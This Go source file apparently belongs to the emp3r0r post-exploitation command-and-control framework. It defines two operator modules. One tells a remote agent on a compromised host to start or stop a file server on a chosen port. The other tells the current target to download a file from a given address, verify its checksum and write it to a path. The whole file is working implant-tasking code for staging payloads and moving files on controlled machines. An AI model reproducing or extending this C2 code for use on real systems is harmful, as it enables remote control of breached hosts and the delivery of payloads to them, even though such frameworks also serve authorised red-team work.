package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/lib/cc/agent_util"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/def"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func moduleFileServer() {
	switchOpt, ok := AvailableModuleOptions["switch"]
	if !ok {
		logging.Errorf("Option 'switch' not found")
		return
	}
	server_switch := switchOpt.Val

	portOpt, ok := AvailableModuleOptions["port"]
	if !ok {
		logging.Errorf("Option 'port' not found")
		return
	}
	cmd := fmt.Sprintf("%s --port %s --switch %s", emp3r0r_def.C2CmdFileServer, portOpt.Val, server_switch)
	err := agent_util.SendCmd(cmd, "", def.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	logging.Infof("File server (port %s) is now %s", portOpt.Val, server_switch)
}

func moduleDownloader() {
	requiredOptions := []string{"download_addr", "checksum", "path"}
	for _, opt := range requiredOptions {
		if _, ok := AvailableModuleOptions[opt]; !ok {
			logging.Errorf("Option '%s' not found", opt)
			return
		}
	}

	download_addr := AvailableModuleOptions["download_addr"].Val
	checksum := AvailableModuleOptions["checksum"].Val
	path := AvailableModuleOptions["path"].Val

	cmd := fmt.Sprintf("%s --download_addr %s --checksum %s --path %s", emp3r0r_def.C2CmdFileDownloader, download_addr, checksum, path)
	err := agent_util.SendCmdToCurrentTarget(cmd, "")
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
